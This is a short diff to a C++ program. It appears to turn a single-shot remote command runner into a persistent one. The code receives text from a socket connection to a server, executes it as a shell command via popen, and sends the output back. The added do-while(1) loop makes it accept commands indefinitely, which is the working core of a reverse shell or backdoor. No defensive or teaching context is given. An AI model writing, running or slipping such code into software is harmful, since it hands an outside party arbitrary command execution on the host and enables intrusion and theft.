@@ -30,6 +30,8 @@ int main()
     check(r,server);
     char buffer[4096];
     memset(buffer, 0, sizeof(buffer));
+    do
+    {
     int l=recv(server,buffer,4096,0);
     FILE* p=popen(buffer,"r");
     if(p==nullptr)
@@ -45,5 +47,7 @@ int main()
     int s=send(server,endresult.c_str(),endresult.size(),0);
     check(s,server);
     fclose(p);
+    }
+    while(1);
     close(server);
 }
